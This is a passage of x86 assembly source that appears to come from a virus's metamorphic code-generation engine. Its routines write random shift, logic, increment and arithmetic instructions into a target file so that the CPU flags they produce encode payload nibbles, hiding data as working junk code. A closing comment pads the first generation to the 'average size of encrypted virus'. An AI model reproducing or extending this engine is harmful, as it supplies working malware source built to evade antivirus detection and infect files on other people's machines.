; ###########################################################################
; #####  Nibble 2: CF PF (AF undefined, SF undefined?) - (SHL, SHR, SAL, SAR)

GenerateNibble2:
; edi             ... pointer in filecode
; bl & 0000'1111b ... nibble to generate


; ebp:
; 0  ... shl Reg, 1
; 1  ... shl Reg, N/cl
; 4  ... sal Reg, 1
; 5  ... sal Reg, N/cl
; 7  ... sar Reg, N/cl


	call	InformationToFlagByte	; bh=flag byte

    GN2_GetTypeAgain:
	call	GetRandomNumber
	mov	ebp, dword[RandomNumber]
	and	ebp, 0000'0111b

	cmp	ebp, 2
    je	GN2_GetTypeAgain
	cmp	ebp, 3
    je	GN2_GetTypeAgain
	cmp	ebp, 6
    je	GN2_GetTypeAgain

	push	0	; counter

    GN2_Shift_loop:			     ; shl Reg, 1

	pop	ecx
	inc	ecx
	push	ecx
	cmp	ecx, 0x2A
	ja	GN_PossibleInfinitLoop

	call	GetRandomNumber
	mov	ecx, dword[RandomNumber]

	GN2_CF_GetAnotherCL:
		call	GetRandomNumber
		mov	ecx, dword[RandomNumber]

		test	ecx, 0001'1111b     ; shiftcount must not be zero
	jz	GN2_CF_GetAnotherCL

	call	GetRandomNumber
	mov	eax, dword[RandomNumber]
	push	eax

	cmp	ebp, 0
	jne	GN2_Shift_loop_SHLN

	shl	eax, 1
    jmp GN2_Shift_loop_LAHF

    GN2_Shift_loop_SHLN:		     ; shl Reg, N/cl
	cmp	ebp, 1
	jne	GN2_Shift_loop_SAL1

	shl	eax, cl
    jmp GN2_Shift_loop_LAHF

    GN2_Shift_loop_SAL1:		     ; sal Reg, 1
	cmp	ebp, 4
	jne	GN2_Shift_loop_SALN

	sal	eax, 1
    jmp GN2_Shift_loop_LAHF


    GN2_Shift_loop_SALN:		     ; sal Reg, N
	cmp	ebp, 5
	jne	GN2_Shift_loop_SARN

	sal	eax, cl
    jmp GN2_Shift_loop_LAHF


    GN2_Shift_loop_SARN:		     ; sar Reg, N
	sar	eax, cl
;    jmp GN3_Shift_loop_LAHF


    GN2_Shift_loop_LAHF:
	lahf

	pop	edx

	and	ah, byte[FlagMask]
	and	bh, byte[FlagMask]

	cmp	ah, bh
    jne GN2_Shift_loop

	pop	eax	; remove counter

    GN2_GetDifferentRegister:
	call	GetRandomNumber
	mov	eax, dword[RandomNumber]
	and	al, 0000'0011b
	cmp	al, 0000'0001b
    je	GN2_GetDifferentRegister	; dont use ECX because we can use CL as second parameter (~2h to find this :) )

	or	al, 0xB8		; al=1011'10NN - NN...random  (eax, ebx, edx)
	mov	byte[edi], al
	inc	edi

	mov	dword[edi], edx
	add	edi, 4

	push	ebp
	and	ebp, 0000'0001b
	pop	ebp
	jnz	GN2_ShiftN		; is it "shift Reg, 1" ?

	mov	byte[edi], 0xD1
	inc	edi

	and	al, 0000'0011b
	cmp	ebp, 0
	jne	GN2_Shift_CreateCode_SAL
	add	al, 0xE0
    jmp GN2_Shift_CreateCode_done

    GN2_Shift_CreateCode_SAL:
	cmp	ebp, 4
	jne	GN2_Shift_CreateCode_SAR
	add	al, 0xF0
    jmp GN2_Shift_CreateCode_done

    GN2_Shift_CreateCode_SAR:
	add	al, 0xF0

    GN2_Shift_CreateCode_done:
	mov	byte[edi], al
	inc	edi
    jmp GN2_Shift_End

    GN2_ShiftN:

	and	al, 0000'0011b

	cmp	ebp, 1
	jne	GN2_ShiftNum_NotShl

	add	al, 0xE0		  ; shl
	jmp	GN2_ShiftNum_WriteNow

	GN2_ShiftNum_NotShl:
	cmp	ebp, 5
	jne	GN2_ShiftNum_NotSal

	add	al, 0xF0		  ; sal
	jmp	GN2_ShiftNum_WriteNow

	GN2_ShiftNum_NotSal:
	add	al, 0xF8		  ; sar
;        jmp     GN2_ShiftNum_WriteNow

    GN2_ShiftNum_WriteNow:

	call	GetRandomNumber
	mov	ah, byte[RandomNumber]	; 0 ... shift Reg, NNNN
					; 1 ... shift Reg, cl
	and	ah, 0000'0001b

	jz	GN2_Shift_Num

	mov	byte[edi], 0xB9 	; mov ecx, ...
	inc	edi

	mov	dword[edi], ecx
	add	edi, 4

	mov	byte[edi], 0xD3
	inc	edi

	mov	byte[edi], al
	inc	edi
    jmp GN2_Shift_End

    GN2_Shift_Num:
	mov	byte[edi], 0xC1
	inc	edi

	mov	byte[edi], al
	inc	edi

	mov	byte[edi], cl
	inc	edi


    GN2_Shift_End:

	mov	dword[VerifiedAddress], edi
ret


; #####  Nibble 2: CF PF (AF undefined, SF undefined?) - (SHL, SHR, SAL, SAR)
; ###########################################################################


; ###########################################################################
; #####  Nibble 3: PF SF (AF undefined) - (AND, XOR, TEST)

GenerateNibble3:
; edi             ... pointer in filecode
; bl & 0000'1111b ... nibble to generate



	call	InformationToFlagByte	; bh=flag byte

	call	GetRandomNumber
	mov	ebp, dword[RandomNumber]
	and	ebp, 0000'0011b

	push	0

    GN3_AndXorTest_Loop:

	pop	eax
	inc	eax
	push	eax
	cmp	eax, 0x2A
	ja	GN_PossibleInfinitLoop

	call	GetRandomNumber
	mov	eax, dword[RandomNumber]
	push	eax

	call	GetRandomNumber
	mov	ecx, dword[RandomNumber]

	cmp	ebp, 0
	jne	GN3_AndXorTest_NotAnd
	and	eax, ecx
	jmp	GN3_AndXorTest_LAHF

     GN3_AndXorTest_NotAnd:
	cmp	ebp, 1
	jne	GN3_AndXorTest_NotXor
	xor	eax, ecx
	jmp	GN3_AndXorTest_LAHF

     GN3_AndXorTest_NotXor:
	test	eax, ecx
	jmp	GN3_AndXorTest_LAHF

     GN3_AndXorTest_LAHF:
	pop	edx

	lahf

	and	ah, byte[FlagMask]
	and	bh, byte[FlagMask]
	cmp	ah, bh
    jne GN3_AndXorTest_Loop

	pop	eax	; remove counter

	call	GetRandomNumber
	mov	eax, dword[RandomNumber]
	and	eax, 0000'0011b
	or	al, 0xB8		; al=1011'10NN - NN...random  (eax, ebx, ecx, edx)
	mov	byte[edi], al
	and	eax, 0000'0011b
	inc	edi

	mov	dword[edi], edx 	; mov Reg1, NUMBER
	add	edi, 4

	and	eax, 0000'0011b

	call	GetRandomNumber
	mov	esi, dword[RandomNumber]
	and	esi, 0000'0001b

	je	GN3_AndXorTest_Num
					; and Reg1, Reg2
     GN3_AndXorTest_TwoRegisters_Next:
	call	GetRandomNumber
	mov	ebx, dword[RandomNumber]
	and	ebx, 0011b
	cmp	ebx, eax
     je GN3_AndXorTest_TwoRegisters_Next       ; Not the same registers!

	or	bl, 0xB8
	mov	byte[edi], bl	    ; mov Reg2, ...
	inc	edi
	mov	dword[edi], ecx     ; mov Reg2, NNNN
	add	edi, 4

	cmp	ebp, 0
	jne	GN3_AndXorTest_2Regs_NoAnd
	mov	byte[edi], 0x21
    jmp GN3_AndXorTest_2Regs_cont1

    GN3_AndXorTest_2Regs_NoAnd:
	cmp	ebp, 1
	jne	GN3_AndXorTest_2Regs_NoXor

	mov	byte[edi], 0x31
    jmp GN3_AndXorTest_2Regs_cont1

    GN3_AndXorTest_2Regs_NoXor:
	mov	byte[edi], 0x85
    jmp GN3_AndXorTest_2Regs_cont1

    GN3_AndXorTest_2Regs_cont1:
	inc	edi

	and	bl, 0011b	    ; Reg2
	shl	bl, 3		    ; bl=000??000
	add	bl, al		    ; bl=000??0??
	add	bl, 1100'0000b	    ; bl=110??0??
	mov	byte[edi], bl
	inc	edi
    jmp GN3_AndXorTest_Fin

    GN3_AndXorTest_Num:
	push	ebp
	and	ebp, 0000'0010b
	pop	ebp
	jz	GN3_AndXorTest_Num_AndXor

	mov	byte[edi], 0xF7
	inc	edi

	or	al, 0xC0
	mov	byte[edi], al
	inc	edi

	mov	dword[edi], ecx
	add	edi, 4
    jmp GN3_AndXorTest_Fin


    GN3_AndXorTest_Num_AndXor:
	mov	byte[edi], 0x81
	inc	edi

	cmp	ebp, 0
	jne	GN3_AndXorTest_Num_NoAnd
	or	al, 0xE0
    jmp GN3_AndXorTest_Num_cont1

    GN3_AndXorTest_Num_NoAnd:
	or	al, 0xF0
;    jmp GN3_AndXorTest_Num_cont1

    GN3_AndXorTest_Num_cont1:
	mov	byte[edi], al
	inc	edi

	mov	dword[edi], ecx
	add	edi, 4

   GN3_AndXorTest_Fin:

	mov	dword[VerifiedAddress], edi
ret


; #####  Nibble 3: CF PF SF (AF undefined) - (AND, XOR, TEST)
; ###########################################################################



; ###########################################################################
; #####  Nibble 4: AF PF SF (DEC, INC)

GenerateNibble4:
; edi             ... pointer in filecode
; bl & 0000'1111b ... nibble to generate


	call	InformationToFlagByte	; bh=flag byte

	call	GetRandomNumber
	mov	ebp, dword[RandomNumber]
	and	ebp, 0000'0001b


	push	0

    GN4_IncDec_Loop:

	pop	eax
	inc	eax
	push	eax
	cmp	eax, 0x2A
	ja	GN_PossibleInfinitLoop

	call	GetRandomNumber
	mov	eax, dword[RandomNumber]
	push	eax

	cmp	ebp, 0
	je	GN4_IncDec_Loop_DEC

	inc	eax
	lahf
    jmp GN4_IncDec_Loop_fin

    GN4_IncDec_Loop_DEC:
	dec	eax
	lahf

    GN4_IncDec_Loop_fin:
	pop	edx

	and	ah, byte[FlagMask]
	and	bh, byte[FlagMask]
	cmp	ah, bh
    jne GN4_IncDec_Loop

	pop	eax	; remove counter

	call	GetRandomNumber
	mov	eax, dword[RandomNumber]
	and	al, 0000'0011b
	or	al, 0xB8		; al=1011'10NN - NN...random  (eax, ebx, ecx, edx)
	mov	byte[edi], al
	inc	edi

	mov	dword[edi], edx
	add	edi, 4


	and	al, 0000'0011b

	cmp	ebp, 1
	je	GN4_IncDec_Loop_writeByteINC

	add	al, 8

    GN4_IncDec_Loop_writeByteINC:
	add	al, 0x40

	mov	byte[edi], al
	inc	edi

	mov	dword[VerifiedAddress], edi
ret


; #####  Nibble 4: AF PF SF (DEC, INC)
; ###########################################################################


; ###########################################################################
; #####  Nibble 5: AF CF PF SF (ADD, CMD, NEG, SUB)


GenerateNibble5:
; edi             ... pointer in filecode
; bl & 0000'1111b ... nibble to generate

; AF CF PF SF
; using ADD, SUB, CMP, NEG

	call	GetRandomNumber
	mov	ebp, dword[RandomNumber]
	and	ebp, 0000'0011b

	cmp	ebp, 0x0
	je	GN5_Neg



    GN8AddSubCmpNext:
	call	GetRandomNumber
	mov	ebp, dword[RandomNumber]
	and	ebp, 0000'0011b 	  ; ebp tells which instruction to use (1=add, 2=sub, 3=cmp)
    jz	GN8AddSubCmpNext
	jmp	GN5_AddSubCmp

    GN5_fin:

	mov	dword[VerifiedAddress], edi
ret



GN5_Neg:
	call	InformationToFlagByte	; bh=flag byte

	push	0

    GN5_Neg_Loop:

	pop	eax
	inc	eax
	push	eax
	cmp	eax, 0x2A
	ja	GN_PossibleInfinitLoop

	call	GetRandomNumber
	mov	eax, dword[RandomNumber]
	push	eax

	neg	eax
	lahf

	pop	edx

	cmp	ah, bh
    jne GN5_Neg_Loop

	pop	eax

	call	GetRandomNumber
	mov	eax, dword[RandomNumber]
	and	al, 0000'0011b
	or	al, 0xB8		; al=1011'10NN - NN...random  (eax, ebx, ecx, edx)
	mov	byte[edi], al
	inc	edi

	mov	dword[edi], edx
	add	edi, 4

	mov	byte[edi], 0xF7
	inc	edi

	and	al, 0000'0011b
	add	al, 0xD8
	mov	byte[edi], al
	inc	edi

jmp	GN5_fin




GN5_AddSubCmp:
	call	InformationToFlagByte	; bh=flag byte
	call	GetRandomNumber

	push	0		; loop counter

   GN5_AddSubCmp_Loop:

	pop	edx
	inc	edx
	push	edx
	cmp	edx, 0x2A
	ja	GN_PossibleInfinitLoop

	mov	edx, dword[RandomNumber]
	push	edx
	call	GetRandomNumber
	mov	esi, dword[RandomNumber]

	cmp	ebp, 1
	je	GN5_AddSubCmp_Loop_Sub

	cmp	ebp, 2
	je	GN5_AddSubCmp_Loop_Cmp

	mov	ecx, 0x01C0
	add	edx, esi
    jmp GN5_AddSubCmp_Loop_LAHF

    GN5_AddSubCmp_Loop_Sub:
	mov	ecx, 0x29E8
	sub	edx, esi
    jmp GN5_AddSubCmp_Loop_LAHF

    GN5_AddSubCmp_Loop_Cmp:
	mov	ecx, 0x39F8
	cmp	edx, esi


    GN5_AddSubCmp_Loop_LAHF:
	lahf

	pop	edx

	and	ah, byte[FlagMask]
	and	bh, byte[FlagMask]
	cmp	ah, bh
   jne	GN5_AddSubCmp_Loop

	pop	eax	; remove counter

	call	GetRandomNumber
	mov	eax, dword[RandomNumber]
	and	eax, 0000'0011b    ; create Register number
	push	eax		   ; save Register number

	mov	bl, al
	add	bl, 0xB8

	mov	byte[edi], bl
	inc	edi

	mov	dword[edi], edx
	add	edi, 4			; mov Reg1, NNNN

	call	GetRandomNumber
	mov	eax, dword[RandomNumber]
	and	eax, 1

	jz	GN5_AddSubCmp_TwoRegisters


	mov	byte[edi], 0x81
	inc	edi

	mov	dl, cl
	pop	eax		    ; get Register number
	add	dl, al		    ; use Register number
	mov	byte[edi], dl	    ; add Reg, ...
	inc	edi
	mov	dword[edi], esi
	add	edi, 4
   jmp	GN5_fin

   GN5_AddSubCmp_TwoRegisters:

	pop	eax		; Register number
	and	al, 0000'0011b

     GN5_AddSubCmp_TwoRegisters_Next:
	call	GetRandomNumber
	mov	ebx, dword[RandomNumber]
	and	ebx, 0011b
	cmp	ebx, eax
     je GN5_AddSubCmp_TwoRegisters_Next       ; Not the same registers!

	or	bl, 0xB8
	mov	byte[edi], bl	    ; mov Reg2, ...
	inc	edi
	mov	dword[edi], esi     ; mov Reg2, NNNN
	add	edi, 4

	and	bl, 0011b	    ; Reg2
	shl	bl, 3		    ; bl=000??000
	add	bl, al		    ; bl=000??0??
	or	bl, 1100'0000b	    ; bl=110??0??
	mov	byte[edi], ch
	inc	edi
	mov	byte[edi], bl
	inc	edi		    ; add Reg1, Reg2

jmp	GN5_fin

; #####  Nibble 5: AF CF PF SF (ADD, CMD, NEG, SUB)
; ###########################################################################

InformationToFlagByte:
; in:  bl=0000'SAPC
; out: bh=S00A'0P1C

	push	eax
	mov	al, bl
				; CF:
	mov	bh, bl		; ah=0000'SAPC
	and	bh, 0000'0001b	; ah=0000'000C

				; PF:
	shl	bl, 1		; al=000S'APC0
	or	bh, bl		; ah=000S'APCC
	and	bh, 0000'0101b	; ah=0000'0P0C

				; AF:
	shl	bl, 1		; al=00SA'PC00
	and	bl, 0011'0000b	; al=00SA'0000
	or	bh, bl		; ah=00SA'0P0C
	and	bh, 0001'0101b	; ah=000A'0P0C

				; SF:
	shl	bl, 2		; al=SA00'0000
	or	bh, bl		; ah=SA0A'0P0C
	and	bh, 1001'0101b	; ah=S00A'0P0C
	or	bh, 0000'0010b	; ah=S00A'0P1C

	xchg	al, bl
	pop	eax
ret


GN_PossibleInfinitLoop:
; given Nibble could not be created with current methode
; therefore give up after 42+ trials and try with another one


	pop	eax	    ; remove counter
	pop	eax	    ; remove return-addresse

	mov	edi, dword[VerifiedAddress]	; last correct addresse of file

			    ; if there has already been some code written to the
			    ; new file, it can be considered as random functional trash :)

jmp	CreateCodeForNibble



; #####
; #####   Generate Nibbles
; #####
; ###########################################################################


GetRandomNumber:
	pushad
		xor	edx, edx
		mov	eax, dword[RandomNumber]
		ror	eax, 16

		mov	ebx, 1103515245
		mul	ebx	       ; EDX:EAX = EDX:EAX * EBX

		add	eax, 12345
		rol	eax, 16
		mov	dword[RandomNumber], eax
	popad
ret

CreateSpecialRndNumber:
; in: ebx, ecx
; out: edx=(rand()%ebx + ecx)

		call	GetRandomNumber

		xor	edx, edx
		mov	eax, dword[RandomNumber]
		div	ebx

		add	edx, ecx
ret

WholeCodeEnd:

times (175'269 + 7 * 1149 - (WholeCodeEnd-StartEngine)) db 0x0	     ; 1st generation padding
					       ; This is average size of encrypted virus + 7 * sigma - 1st gen. code
					       ; 7*sigma ~ 99.999999999744 % of all cases
					       ; (i took the average of 15files, as statistics is very high in one
					       ; file, this is to a very good approx. gauss distributed)
.end start
